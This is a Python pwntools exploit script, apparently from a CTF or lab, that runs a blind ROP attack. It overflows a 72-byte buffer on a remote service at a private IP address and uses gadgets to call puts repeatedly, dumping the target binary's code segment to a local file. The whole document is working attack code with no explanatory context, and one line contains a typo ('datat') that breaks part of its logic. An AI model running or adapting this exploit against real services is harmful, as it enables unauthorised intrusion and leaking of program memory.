from pwn import*
def leak(length,rdi_ret,puts_plt,leak_addr,stop_gadget):
    p = remote('192.168.10.185',4444)
    payload = 'a'*length + p64(rdi_ret) + p64(leak_addr) + p64(puts_plt) + p64(stop_gadget)
    p.recvuntil('password?\n')
    p.sendline(payload)
    try:
        data = p.recv()
        p.close()
        try:
            data = datat[:data.index("\nWelCome")]
        except Exception:
            data = data
        if data == "":
            data = "\x00"
        return data
    except Exception:
        p.close()
        return None

length = 72
stop_gadget = 0x4006b6
brop_gadget = 0x4007ba
rdi_ret = brop_gadget + 9
puts_plt = 0x400560
addr = 0x400000
result = ''
while addr < 0x401000:
    print hex(addr)
    data = leak(length,rdi_ret,puts_plt,addr,stop_gadget)
    if data is None:
        result += '\x00'
        addr += 1
        continue
    else:
        result += data
    addr += len(data)

with open('code','wb') as f:
    f.write(result)
